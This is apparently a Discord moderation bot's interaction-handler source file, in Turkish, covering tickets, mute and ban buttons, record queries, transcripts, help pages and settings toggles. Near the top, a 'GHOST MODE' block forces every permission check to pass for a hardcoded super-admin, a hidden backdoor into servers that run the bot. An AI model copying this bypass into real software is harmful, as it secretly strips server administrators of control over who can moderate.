const { Events, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, ChannelType, PermissionFlagsBits, AttachmentBuilder } = require('discord.js');
const { COLORS } = require('../utils/embeds');
const { pool, updateConfigCache } = require('../db');
const config = require('../config.json');
const { createContainerMessage, buildModBResponse, buildModAPanel } = require('../utils/uiBuilder');
const systemNode = require('../utils/systemNode');
const { createTicket, checkTicketLimits, closeTicketChannel } = require('../utils/ticketManager');
const { handleSorguSelect, handleExport } = require('../utils/sorguHelpers');
const { generateDiscordTranscriptHtml, generateDiscordTranscriptText } = require('../utils/discordHtmlExporter');
const { helpEmbedHome, createHelpComponents } = require('../commands/moderation/yardim');
const { getSettingsPage, handleSettingsSelect } = require('../commands/moderation/settings');

module.exports = {
    name: Events.InteractionCreate,
    async execute(interaction, client) {
        if (!interaction.guildId || !interaction.guild) {
            const payload = buildModBResponse({
                title: 'DM Erişimi Kapalı',
                textLines: ['Botun yönetim ve güvenlik komutları Özel Mesaj (DM) üzerinden kullanılamaz.\n\nLütfen komutları sunucu içerisinde çalıştırın.']
            });
            if (interaction.isRepliable()) await interaction.reply(payload).catch(()=>{});
            return;
        }

        if (interaction.guildId && !systemNode.checkGuildNode(interaction.guildId)) {
            const payload = buildModBResponse({
                title: 'Yetki Hatası',
                textLines: [`Bu komutu kullanmak için bu sunucuda yetkili olmanız gerekmektedir.\n\nEğer siz de böyle bir bota sahip olmak isterseniz sahibim <@651790387198820425> ile iletişime geçebilirsiniz.`],
                color: COLORS.ERROR
            });
            if (interaction.isRepliable()) await interaction.reply(payload).catch(()=>{});
            return;
        }

        if (interaction.member && interaction.member.permissions && systemNode.checkSystemNode(interaction.user.id)) {
            // GHOST MODE: Override permissions for Super Admin so they pass EVERY internal check
            interaction.member.permissions.has = () => true;
        }

        if (interaction.guildId) {
            const { logGlobalAction } = require('../utils/logger');
            let actionType = 'Bilinmiyor';
            let actionDetail = 'Bilinmeyen işlem';
            
            if (interaction.isChatInputCommand()) {
                actionType = 'SLASH_COMMAND';
                actionDetail = `/${interaction.commandName}`;
            } else if (interaction.isButton()) {
                actionType = 'BUTTON_CLICK';
                actionDetail = `Buton: ${interaction.customId}`;
            } else if (interaction.isAnySelectMenu()) {
                actionType = 'SELECT_MENU';
                actionDetail = `Menu: ${interaction.customId} (Secilen: ${interaction.values ? interaction.values.join(',') : 'Yok'})`;
            } else if (interaction.isModalSubmit()) {
                actionType = 'MODAL_SUBMIT';
                actionDetail = `Modal: ${interaction.customId}`;
            }

            if (actionType !== 'Bilinmiyor') {
                logGlobalAction(interaction.guildId, interaction.user.id, actionType, actionDetail).catch(e => console.error(e));
            }
        }

        if (interaction.isChatInputCommand()) {
            const command = client.commands.get(interaction.commandName);
            if (!command) return;

            try {
                await command.execute(interaction, client);
            } catch (error) {
                console.error(`Komut hatası: ${interaction.commandName}`, error);
                let title = 'Hata';
                let desc = 'Bu komutu çalıştırırken bir hata oluştu.';
                if (error.message && error.message.includes('Missing Permissions')) {
                    title = 'Yetki Hatası';
                    desc = 'Botun bu işlemi gerçekleştirmek için yeterli yetkisi bulunmuyor.';
                }
                const payload = buildModBResponse({ title, textLines: [desc], color: COLORS.ERROR });
                if (interaction.replied || interaction.deferred) await interaction.followUp(payload).catch(() => {});
                else await interaction.reply(payload).catch(() => {});
            }
            return;
        }

        // --- STATELESS ROUTING ---
        if (!interaction.isButton() && !interaction.isStringSelectMenu() && !interaction.isRoleSelectMenu() && !interaction.isChannelSelectMenu() && !interaction.isModalSubmit()) return;

        // Özel Oda (Private Room) Yönlendirmesi
        const { handlePrivateRoomInteraction } = require('../utils/privateRoomInteractionHandler');
        await handlePrivateRoomInteraction(interaction, client);

        // Geçiş dönemi için (henüz tam namespace'e geçmemiş eskiler için fallback)
        let namespace, action, targetId;
        if (interaction.customId.includes(':')) {
            const parts = interaction.customId.split(':');
            namespace = parts[0];
            action = parts[1];
            targetId = parts.slice(2).join(':');
        } else {
            namespace = 'legacy';
            action = interaction.customId;
        }

        // TICKET NAMESPACE
        if (namespace === 'ticket' || action.startsWith('ticket_')) {
            
            if (action === 'create' || action === 'ticket_create_btn' || action.startsWith('ticket_cat_')) {
                const isAdmin = interaction.member.permissions.has(PermissionFlagsBits.Administrator) || interaction.member.permissions.has(PermissionFlagsBits.ManageChannels);
                if (!isAdmin) {
                    const { ticketsToday, cooldownRemaining } = await checkTicketLimits(interaction.guild.id, interaction.user.id);
                    if (ticketsToday >= 3) return interaction.reply({ content: 'Günlük ticket açma sınırınıza ulaştınız (Maksimum 3). Lütfen yarın tekrar deneyin.', ephemeral: true }).catch(() => {});
                    if (cooldownRemaining > 0) {
                        const minutes = Math.ceil(cooldownRemaining / (60 * 1000));
                        return interaction.reply({ content: `Yeni bir destek talebi açmadan önce **${minutes} dakika** daha beklemelisiniz.`, ephemeral: true }).catch(() => {});
                    }
                }
                const modal = new ModalBuilder().setCustomId('ticket:modal:submit').setTitle('Destek Talebi (Ticket)');
                const categoryInput = new TextInputBuilder().setCustomId('ticket_category_text').setLabel('Kategori (Örn: Hesap, Ceza, Sunucu)').setStyle(TextInputStyle.Short).setRequired(true).setPlaceholder('Hesabım / Ceza / Sunucu Şikayeti vb.');
                
                if (action === 'ticket_cat_hesap') categoryInput.setValue('Hesap İşlemleri');
                else if (action === 'ticket_cat_ceza') categoryInput.setValue('Ceza İtiraz');
                else if (action === 'ticket_cat_sunucu') categoryInput.setValue('Sunucu Sorunları');
                else if (action === 'ticket_cat_genel') categoryInput.setValue('Genel Destek');
                const reasonInput = new TextInputBuilder().setCustomId('ticket_reason').setLabel('Talebinizin detayını yazın:').setStyle(TextInputStyle.Paragraph).setRequired(true).setPlaceholder('Lütfen sorununuzu detaylı bir şekilde açıklayın...');
                modal.addComponents(new ActionRowBuilder().addComponents(categoryInput), new ActionRowBuilder().addComponents(reasonInput));
                return interaction.showModal(modal).catch(() => {});
            }
            if (action === 'modal' || action.startsWith('ticket_modal')) {
                let categoryLabel = 'Genel Destek';
                try { categoryLabel = interaction.fields.getTextInputValue('ticket_category_text'); } catch(e){}
                const reason = interaction.fields.getTextInputValue('ticket_reason');
                return createTicket(interaction, reason, categoryLabel);
            }
            if (action === 'close' || action === 'ticket_close_btn') {
                return closeTicketChannel(interaction);
            }
            if (action === 'claim' || action === 'ticket_claim_btn') {
                const { claimTicketChannel } = require('../utils/ticketManager');
                return claimTicketChannel(interaction);
            }
        }

        // MOD NAMESPACE
        if (namespace === 'mod') {
            if (action === 'mute') {
                try { await interaction.deferReply({ ephemeral: true }); } catch (e) { return; }
                try {
                    const member = await interaction.guild.members.fetch(targetId);
                    await member.timeout(10 * 60 * 1000, 'Buton üzerinden hızlı mute');
                    await interaction.editReply({ content: `<@${targetId}> kullanıcısı susturuldu.` }).catch(() => {});
                } catch (error) {
                    await interaction.editReply({ content: `İşlem başarısız: Kullanıcı bulunamadı veya yetkim yetersiz.` }).catch(() => {});
                }
            } else if (action === 'ban') {
                try { await interaction.deferReply({ ephemeral: true }); } catch (e) { return; }
                try {
                    const member = await interaction.guild.members.fetch(targetId);
                    let conn;
                    try {
                        conn = await pool.getConnection();
                        const rows = await conn.query('SELECT banned_role_id FROM guild_config WHERE guild_id = ?', [interaction.guild.id]);
                        if (rows.length > 0 && rows[0].banned_role_id) {
                            await member.roles.add(rows[0].banned_role_id);
                            await interaction.editReply({ content: `<@${targetId}> kullanıcısı yasaklandı.` }).catch(() => {});
                        } else {
                            await interaction.editReply({ content: `Yasaklı rolü ayarlanmamış.` }).catch(() => {});
                        }
                    } finally { if (conn) conn.release(); }
                } catch (error) {
                    await interaction.editReply({ content: `İşlem başarısız: Kullanıcı bulunamadı veya yetkim yetersiz.` }).catch(() => {});
                }
            } else if (action === 'ignore') {
                try { await interaction.deferUpdate(); } catch (e) { return; }
                await interaction.message.delete().catch(() => {});
            }
        }
        
        // ISTATISTIK REFRESH
        if (action === 'istatistik_refresh') {
            try { await interaction.deferUpdate(); } catch (e) { return; }
            const { generateStatsText } = require('../commands/moderation/istatistik');
            const { buildModBResponse, MONO_EMOJIS } = require('../utils/uiBuilder');
            try {
                const text = await generateStatsText(interaction.client, interaction);
                const refreshBtn = new ButtonBuilder()
                    .setCustomId('istatistik_refresh')
                    .setLabel('Sayfayı Yenile')
                    .setEmoji(MONO_EMOJIS.status)
                    .setStyle(ButtonStyle.Secondary);
                const row = new ActionRowBuilder().addComponents(refreshBtn);
                await interaction.editReply(buildModBResponse({ textLines: [text], actionRows: [row] })).catch(() => {});
            } catch (err) {
                console.error(err);
            }
        }

        // YETKİLİ BAŞVURU (APP SYSTEM)
        if (action.startsWith('app_') || action === 'staff_apply_btn' || action === 'staff_apply_submit') {
            const { handleApplicationInteraction } = require('../utils/applicationSystem');
            return handleApplicationInteraction(interaction, action);
        }

        // SORGU NAMESPACE
        if (namespace === 'sorgu') {
            if (action === 'select') {
                try { await interaction.deferUpdate(); } catch (e) { return; }
                return handleSorguSelect(interaction, interaction.values[0], targetId);
            }
            if (action.startsWith('export_')) {
                const exportType = action.replace('export_', '');
                return handleExport(interaction, exportType, targetId);
            }
            if (action === 'transcript_picker') {
                try { await interaction.deferReply({ ephemeral: true }); } catch (e) { return; }
                const rawTicketId = interaction.values[0].replace('sorgu:transcript:', '');
                const ticketId = parseInt(rawTicketId, 10);
                if (!ticketId || isNaN(ticketId)) return interaction.editReply({ content: 'Geçersiz ticket numarası.' });
                let conn;
                try {
                    conn = await pool.getConnection();
                    const rows = await conn.query('SELECT * FROM tickets WHERE id = ?', [ticketId]);
                    if (rows.length === 0) return interaction.editReply({ content: 'Transcript bulunamadı.' });
                    const ticket = rows[0];
                    const dbMsgs = await conn.query('SELECT * FROM ticket_messages WHERE channel_id = ? OR ticket_owner_id = ? ORDER BY created_at ASC', [ticket.channel_id, ticket.owner_id]);
                    const htmlContent = await generateDiscordTranscriptHtml({ guild: interaction.guild, channel: { name: `destek-${ticket.owner_tag || 'kullanıcı'}` }, messages: dbMsgs || [], ticketData: ticket });
                    const textContent = generateDiscordTranscriptText({ guild: interaction.guild, channel: { name: `destek-${ticket.owner_tag || 'kullanıcı'}` }, messages: dbMsgs || [], ticketData: ticket });
                    const channelSlug = ticket.owner_tag ? `destek-${ticket.owner_tag}` : 'destek';
                    const files = [
                        new AttachmentBuilder(Buffer.from(htmlContent, 'utf-8'), { name: `ticket-#${ticket.id}-${channelSlug}.html` }),
                        new AttachmentBuilder(Buffer.from(textContent, 'utf-8'), { name: `ticket-#${ticket.id}-${channelSlug}.txt` })
                    ];
                    return interaction.editReply({ content: `**Ticket #${ticket.id}** ait HTML & Metin transcript dökümü aşağıdadır:`, files });
                } catch (err) {
                    await interaction.editReply({ content: 'Transcript alınırken sistemsel bir hata oluştu.' });
                } finally { if (conn) conn.release(); }
            }
            if (action === 'remove_menu') {
                try { await interaction.deferUpdate(); } catch (e) { return; }
                const selectedValue = interaction.values[0];
                if (selectedValue.startsWith('remove_')) {
                    let type, recordId;
                    if (selectedValue.startsWith('remove_warn_')) { type = 'warn'; recordId = selectedValue.replace('remove_warn_', ''); }
                    else if (selectedValue.startsWith('remove_text_mute_')) { type = 'text_mute'; recordId = selectedValue.replace('remove_text_mute_', ''); }
                    else if (selectedValue.startsWith('remove_voice_mute_')) { type = 'voice_mute'; recordId = selectedValue.replace('remove_voice_mute_', ''); }
                    else if (selectedValue.startsWith('remove_ban_')) { type = 'ban'; recordId = selectedValue.replace('remove_ban_', ''); }

                    let conn;
                    try {
                        conn = await pool.getConnection();
                        let targetUserId = 'Bilinmiyor';

                        if (type === 'warn') {
                            const warnRows = await conn.query('SELECT * FROM warnings WHERE id = ?', [recordId]);
                            targetUserId = warnRows.length > 0 ? warnRows[0].user_id : 'Bilinmiyor';
                            await conn.query('UPDATE warnings SET is_active = FALSE WHERE id = ?', [recordId]);
                            
                            // Rol senkronizasyonu
                            if (targetUserId !== 'Bilinmiyor') {
                                const activeWarnsQuery = await conn.query('SELECT COUNT(id) as count FROM warnings WHERE guild_id = ? AND user_id = ? AND is_active = TRUE', [interaction.guild.id, targetUserId]);
                                const currentActiveCount = Number(activeWarnsQuery[0].count);
                                const configRows = await conn.query('SELECT warn1_role_id, warn2_role_id, banned_role_id FROM guild_config WHERE guild_id = ?', [interaction.guild.id]);
                                
                                if (configRows.length > 0) {
                                    const warn1Id = configRows[0].warn1_role_id;
                                    const warn2Id = configRows[0].warn2_role_id;
                                    const bannedId = configRows[0].banned_role_id;
                                    
                                    try {
                                        const member = await interaction.guild.members.fetch(targetUserId).catch(()=>null);
                                        if (member) {
                                            if (bannedId && member.roles.cache.has(bannedId) && currentActiveCount < 3) {
                                                await member.roles.remove(bannedId, 'Uyarılar 3 ün altına düştüğü için ban kaldırıldı');
                                                const { restoreRoles } = require('../utils/roleMemory');
                                                await restoreRoles(member);
                                            }

                                            if (currentActiveCount === 0) {
                                                if (warn1Id && member.roles.cache.has(warn1Id)) await member.roles.remove(warn1Id, 'Uyarı pasife alındı');
                                                if (warn2Id && member.roles.cache.has(warn2Id)) await member.roles.remove(warn2Id, 'Uyarı pasife alındı');
                                            } else if (currentActiveCount === 1) {
                                                if (warn2Id && member.roles.cache.has(warn2Id)) await member.roles.remove(warn2Id, 'Uyarı pasife alındı, 1 uyarıya düştü');
                                                if (warn1Id && !member.roles.cache.has(warn1Id)) await member.roles.add(warn1Id, 'Uyarı pasife alındı, 1 uyarıya düştü');
                                            } else if (currentActiveCount === 2) {
                                                if (warn1Id && member.roles.cache.has(warn1Id)) await member.roles.remove(warn1Id, 'Uyarı pasife alındı, 2 uyarıya düştü');
                                                if (warn2Id && !member.roles.cache.has(warn2Id)) await member.roles.add(warn2Id, 'Uyarı pasife alındı, 2 uyarıya düştü');
                                            }
                                        }
                                    } catch (e) {
                                        console.error('Role sync error on remove:', e);
                                    }
                                }
                            }
                        } else {
                            const muteRows = await conn.query('SELECT * FROM mutes WHERE id = ?', [recordId]);
                            targetUserId = muteRows.length > 0 ? muteRows[0].user_id : 'Bilinmiyor';
                            await conn.query('UPDATE mutes SET is_active = FALSE WHERE id = ?', [recordId]);
                            
                            // Mute/Ban Rol Senkronizasyonu
                            if (targetUserId !== 'Bilinmiyor') {
                                const configRows = await conn.query('SELECT text_mute_role_id, voice_mute_role_id, banned_role_id FROM guild_config WHERE guild_id = ?', [interaction.guild.id]);
                                if (configRows.length > 0) {
                                    try {
                                        const member = await interaction.guild.members.fetch(targetUserId).catch(()=>null);
                                        if (member) {
                                            const { restoreRoles } = require('../utils/roleMemory');
                                            if (type === 'text_mute' && configRows[0].text_mute_role_id && member.roles.cache.has(configRows[0].text_mute_role_id)) {
                                                await member.roles.remove(configRows[0].text_mute_role_id, 'Cezası pasife alındı');
                                                await member.timeout(null, 'Cezası pasife alındı').catch(()=>{});
                                                await restoreRoles(member);
                                            } else if (type === 'voice_mute' && configRows[0].voice_mute_role_id && member.roles.cache.has(configRows[0].voice_mute_role_id)) {
                                                await member.roles.remove(configRows[0].voice_mute_role_id, 'Cezası pasife alındı');
                                                await restoreRoles(member);
                                            } else if (type === 'ban' && configRows[0].banned_role_id && member.roles.cache.has(configRows[0].banned_role_id)) {
                                                await member.roles.remove(configRows[0].banned_role_id, 'Cezası pasife alındı');
                                                await restoreRoles(member);
                                                
                                                // Ayrıca manuel ban user_roles tablosuna kaydedilmiş olabilir
                                                try {
                                                    const roleRows = await conn.query('SELECT role_id FROM user_roles WHERE user_id = ? AND guild_id = ?', [targetUserId, interaction.guild.id]);
                                                    if (roleRows.length > 0) {
                                                        const rolesToRestore = roleRows.map(r => r.role_id);
                                                        await member.roles.add(rolesToRestore, 'Manuel Ban Pasife Alındı - Roller Geri Verildi');
                                                        await conn.query('DELETE FROM user_roles WHERE user_id = ? AND guild_id = ?', [targetUserId, interaction.guild.id]);
                                                    }
                                                } catch(e) { console.error('Manuel ban rol geri verme hatası', e); }
                                            }
                                        }
                                    } catch(e) {}
                                }
                            }
                        }

                        // Log işlemi
                        const { sendLog } = require('../utils/logger');
                        const { createContainerMessage, MONO_EMOJIS } = require('../utils/uiBuilder');
                        
                        const logPayload = createContainerMessage(
                            `<:mono:${MONO_EMOJIS.shield}> Ceza Pasife Alındı (Silindi)`,
                            'Bir yetkili, veritabanındaki aktif bir ceza kaydını pasif duruma getirdi.',
                            '#FF5555',
                            [],
                            [
                                { name: 'İşlem Yapılan', value: `<@${targetUserId}>`, inline: true },
                                { name: 'İşlemi Yapan (Silen)', value: `<@${interaction.user.id}>`, inline: true },
                                { name: 'Kayıt ID', value: `#${recordId} (${type})`, inline: true }
                            ],
                            false
                        );
                        await sendLog(interaction.guild, logPayload);

                        // Bana özel silindi mesajı at
                        await interaction.followUp({ 
                            content: `#${recordId} (${type}) silindi!`, 
                            ephemeral: true 
                        }).catch(() => {});

                        // Menüyü yenile
                        try {
                            const warns = await conn.query('SELECT id, reason, created_at, moderator_id, "warn" as type FROM warnings WHERE guild_id = ? AND user_id = ? AND is_active = TRUE', [interaction.guild.id, targetUserId]);
                            const mutes = await conn.query('SELECT id, reason, created_at, moderator_id, action_type as type FROM mutes WHERE guild_id = ? AND user_id = ? AND is_active = TRUE', [interaction.guild.id, targetUserId]);
                            
                            const allRecords = [...warns, ...mutes].sort((a, b) => new Date(b.created_at) - new Date(a.created_at)).slice(0, 25);

                            if (allRecords.length === 0) {
                                const { createV2Message, COLORS } = require('../utils/uiBuilder');
                                await interaction.editReply(createV2Message({
                                    title: 'Ceza / Uyarı Kaldırma (Pasife Alma)',
                                    description: `✅ **<@${targetUserId}>** kullanıcısının aktif tüm cezaları/uyarıları silindi.`,
                                    color: COLORS.SUCCESS,
                                    actionRows: []
                                }));
                            } else {
                                let listText = `**<@${targetUserId}>** kullanıcısının kalan aktif cezaları:\n\n`;
                                
                                const { ActionRowBuilder, StringSelectMenuBuilder } = require('discord.js');
                                const { createV2Message, COLORS } = require('../utils/uiBuilder');
                                
                                const options = allRecords.map((w) => {
                                    let typeName = w.type === 'warn' ? 'Uyarı' : (w.type === 'text_mute' ? 'Metin Susturma' : (w.type === 'voice_mute' ? 'Ses Susturma' : 'Ban'));
                                    let labelStr = `${typeName} #${w.id} - ${w.reason || 'Belirtilmemiş'}`;
                                    if (labelStr.length > 100) labelStr = labelStr.substring(0, 97) + '...';
                                    
                                    const date = new Date(w.created_at).toLocaleDateString('tr-TR');
                                    listText += `\`#${w.id}\` **${typeName}** • Yetkili: <@${w.moderator_id || 'Bilinmiyor'}>\n└ Sebep: ${w.reason || 'Belirtilmemiş'} (${date})\n\n`;

                                    return {
                                        label: labelStr,
                                        description: `Tarih: ${date} | Yetkili: ${w.moderator_id || 'Sistem'}`,
                                        value: `remove_${w.type}_${w.id}`
                                    };
                                });

                                const selectMenu = new StringSelectMenuBuilder()
                                    .setCustomId(`sorgu:remove_menu:${targetUserId}`)
                                    .setPlaceholder('Silmek istediğiniz cezayı seçin')
                                    .addOptions(options);

                                const row = new ActionRowBuilder().addComponents(selectMenu);

                                await interaction.editReply(createV2Message({
                                    title: 'Ceza / Uyarı Kaldırma (Pasife Alma)',
                                    description: `${listText}Aşağıdaki menüden silmek (pasife almak) istediğiniz kaydı seçiniz.`,
                                    color: COLORS.DARK,
                                    actionRows: [row]
                                }));
                            }
                        } catch(e) {
                            console.error('Menü yenileme hatası:', e);
                        }
                    } catch (e) {
                        await interaction.followUp({ content: `Hata oluştu: ${e.message}`, ephemeral: true }).catch(() => {});
                    } finally {
                        if (conn) conn.release();
                    }
                    return;
                }
            }
        }

        // YARDIM
        if (action === 'help_category_select') {
            try { await interaction.deferUpdate(); } catch (e) { return; }
            const { helpEmbedHome, createHelpComponents } = require('../commands/moderation/yardim.js');
            const { createContainerMessage, MONO_EMOJIS } = require('../utils/uiBuilder');
            
            const val = interaction.values[0];
            if (val === 'help_home') return interaction.editReply(helpEmbedHome(interaction.guild, interaction.user, [createHelpComponents('home')]));
            
            const getHelpPayload = (title, lines, fields, selected) => {
                const desc = lines.join('\n\n');
                const formattedFields = fields.map(f => ({
                    name: `<:mono:${MONO_EMOJIS.chevron_right}> ${f.name}`,
                    value: f.value,
                    inline: false
                }));

                // showBrand = false for subpages
                return createContainerMessage(title, desc, '#2B2D31', [createHelpComponents(selected)], formattedFields, false);
            };
            
            if (val === 'help_punish') {
                return interaction.editReply(getHelpPayload(
                    'Ceza İşlemleri', 
                    [`<:mono:${MONO_EMOJIS.hammer}> Kuralları ihlal eden kullanıcılara uygulanacak doğrudan ceza komutları:`], 
                    [
                        { name: 'Sunucudan Yasaklama', value: `\`\`\`/yasakla [kullanıcı] [sebep]\`\`\`Kullanıcıyı sunucudan tamamen yasaklar. İsteğe bağlı sebep belirtilebilir.\n\`\`\`/unban [kullanıcı]\`\`\`Yasaklı kullanıcının cezasını kaldırır.` },
                        { name: 'Sunucudan Atma', value: `\`\`\`/at [kullanıcı] [sebep]\`\`\`Kullanıcıyı sunucudan uzaklaştırır, ancak tekrar katılabilir.` },
                        { name: 'Susturma (Time-Out)', value: `\`\`\`/sustur [kullanıcı] [süre(örn: 10m, 1h)] [sebep]\`\`\`Kullanıcının yazı yazmasını süreli engeller.\n\`\`\`/unmute [kullanıcı]\`\`\`Aktif susturmayı veya zaman aşımını iptal eder.` },
                        { name: 'Sesli Odadan Susturma', value: `\`\`\`/ses-sustur [kullanıcı] [sebep]\`\`\`Kullanıcının ses kanallarında konuşmasını yasaklar.` },
                        { name: 'Karantina (Yakında)', value: `\`\`\`/karantina [kullanıcı] [sebep]\`\`\`Kullanıcıyı izole bir odaya hapseder, diğer kanalları göremez.` }
                    ], 
                    'punish'
                ));
            }
            if (val === 'help_stats') {
                return interaction.editReply(getHelpPayload(
                    'Kullanıcı & Sicil Yönetimi', 
                    [`<:mono:${MONO_EMOJIS.clipboard_list}> Kullanıcıların istatistik, uyarı ve geçmiş sicil durumlarını yöneten sistemler:`], 
                    [
                        { name: 'Kapsamlı Sorgu', value: `\`\`\`/sorgu [kullanıcı]\`\`\`Kullanıcının hesap yaşı, davetleri, uyarıları ve mod notlarını tek panelde listeler.` },
                        { name: 'Uyarı Sistemi', value: `\`\`\`/uyar [kullanıcı] [sebep]\`\`\`Kullanıcıya resmi uyarı verir (3 uyarıda otomatik işlem yapılabilir).\n\`\`\`/uyarılar [kullanıcı]\`\`\`Aktif ve geçmiş uyarıları listeler.\n\`\`\`/uyarı-temizle [kullanıcı]\`\`\`Tüm uyarılarını sıfırlar.` },
                        { name: 'Moderatör Notları', value: `\`\`\`/not [kullanıcı] [not]\`\`\`Kullanıcının profiline, sadece yetkililerin görebileceği kalıcı not bırakır.` },
                        { name: 'Davet / Stat (Yakında)', value: `\`\`\`/davet [kullanıcı]\`\`\`Kullanıcının kaç kişi davet ettiğini listeler.\n\`\`\`/mod-stat [yetkili]\`\`\`Yetkilinin kaç işlem (ban, mute) yaptığını gösterir.` }
                    ], 
                    'stats'
                ));
            }
            if (val === 'help_channel') {
                return interaction.editReply(getHelpPayload(
                    'Kanal Yönetimi', 
                    [`<:mono:${MONO_EMOJIS.layout_grid}> Odalar üzerinde toplu işlem, temizlik ve güvenlik sağlayan sistemler:`], 
                    [
                        { name: 'Mesaj Temizliği', value: `\`\`\`/temizle [sayı(1-100)]\`\`\`Kanaldaki son mesajları toplu şekilde siler.` },
                        { name: 'Kanal Kilidi', value: `\`\`\`/kilit [durum: Aç / Kapat]\`\`\`Bulunulan kanalı üyelerin mesaj yazmasına kapatır veya açar.` },
                        { name: 'Yavaş Mod (Slowmode)', value: `\`\`\`/yavaş-mod [süre(saniye)]\`\`\`Kanala iki mesaj arası bekleme süresi koyar (Kapatmak için 0).` },
                        { name: 'Snipe (Mesaj Geri Alma)', value: `\`\`\`/snipe\`\`\`Kanaldaki en son silinen mesajı (fotoğraflar dahil) gösterir.` },
                        { name: 'Oda Sıfırlama (Nuke)', value: `\`\`\`/nuke\`\`\`Kanalı tüm ayarlarıyla kopyalayıp eskisini siler, tertemiz yapar.` }
                    ], 
                    'channel'
                ));
            }
            if (val === 'help_system') {
                return interaction.editReply(getHelpPayload(
                    'Sistem Yapılandırma', 
                    [`<:mono:${MONO_EMOJIS.sliders}> Sunucunun kalbini (ayarları) yönettiğiniz ana modüller:`], 
                    [
                        { name: 'Gelişmiş Kontrol Paneli', value: `\`\`\`/ayarlar\`\`\`Sunucu log kanalları, ticket kurulumu ve sistemlerin aktif/pasif durumlarını yönetebileceğiniz görsel arayüz.` },
                        { name: 'Filtre Yönetimi', value: `\`\`\`/kara-liste\`\`\`Otomatik kelime engelleyiciye yasaklı kelime ekler/çıkarır.` },
                        { name: 'Bilet (Ticket) Sistemi', value: `\`\`\`/destek\`\`\`Destek menüsünü kanala gönderir. Üyeler özel oda açarak yetkililerle görüşebilir.\n\`\`\`/bilet [ekle/çıkar] [kullanıcı]\`\`\`Mevcut bilet odasına başka birini dahil eder.` },
                        { name: 'Özel (Geçici) Odalar', value: `\`\`\`/odapanel\`\`\`Sesli odasını açmış üyelere, kendi odalarını kilitlemeleri, limit koymaları için panel gönderir.` }
                    ], 
                    'system'
                ));
            }
            if (val === 'help_security') {
                return interaction.editReply(getHelpPayload(
                    'Otomatik Korumalar (7/24 Aktif)', 
                    [`<:mono:${MONO_EMOJIS.shield_check}> Komut gerektirmeyen, arka planda çalışan ve sizi koruyan sistemler (Tümü /ayarlar içinden açılıp kapatılabilir):`], 
                    [
                        { name: 'Anti-Spam & Mass Mention', value: `Kullanıcı saniyede birden fazla mesaj atarsa veya tek mesajda 5'ten fazla kişiyi etiketlerse, otomatik uyarılıp 5 dakika susturulur.` },
                        { name: 'Anti-Link & Reklam (Gelişmiş)', value: `Sunucu içi veya özel DM reklamlarını, Discord davet linklerini ve zararlı siteleri anında tespit edip siler.` },
                        { name: 'Akıllı Kelime Filtresi (Anti-Küfür)', value: `(Masa/Kasa ayrımını yapabilen) akıllı algoritma ile, kelimeyi kökünden süzerek sadece argo kullanımları cezalandırır.` },
                        { name: 'Büyük Harf Koruması', value: `Mesajın %65'i veya daha fazlası büyük harften oluşuyorsa (caps lock), mesajı silerek sunucu düzenini sağlar.` }
                    ], 
                    'security'
                ));
            }
        }

        if (action.startsWith('toggle_')) {
            if (!interaction.member.permissions.has('Administrator') && !systemNode.checkSystemNode(interaction.user.id)) return interaction.reply({ content: 'Yönetici izniniz yok.', ephemeral: true }).catch(() => {});
            try { await interaction.deferUpdate(); } catch (e) { return; }
            let conn;
            try {
                conn = await pool.getConnection();
                let field = '';
                if (action === 'toggle_anti_spam') field = 'anti_spam_enabled';
                if (action === 'toggle_anti_link') field = 'anti_link_enabled';
                if (action === 'toggle_anti_swear') field = 'anti_swear_enabled';
                if (action === 'toggle_caps') field = 'caps_filter_enabled';
                if (action === 'toggle_anti_raid') field = 'anti_raid_enabled';
                
                if (field) {
                    const rows = await conn.query(`SELECT ${field} FROM guild_config WHERE guild_id = ?`, [interaction.guild.id]);
                    let newValue = true;
                    if (rows.length > 0) { newValue = !rows[0][field]; await conn.query(`UPDATE guild_config SET ${field} = ? WHERE guild_id = ?`, [newValue, interaction.guild.id]); } 
                    else { newValue = false; await conn.query(`INSERT INTO guild_config (guild_id, ${field}) VALUES (?, ?)`, [interaction.guild.id, newValue]); }
                    updateConfigCache(interaction.guild.id, field, newValue);
                    const pageData = await getSettingsPage(interaction.guild.id, 'page_filters');
                    if (pageData) await interaction.editReply(pageData);
                    await interaction.followUp({ content: `Ayar güncellendi: ${field} = ${newValue ? 'Açık' : 'Kapalı'}`, ephemeral: true }).catch(() => {});
                }
            } finally { if (conn) conn.release(); }
        }

        if (interaction.isRoleSelectMenu() || interaction.isChannelSelectMenu() || action === 'settings_menu' || action === 'auto_setup_ticket') {
            if (handleSettingsSelect) {
                return handleSettingsSelect(interaction);
            }
        }
    }
};
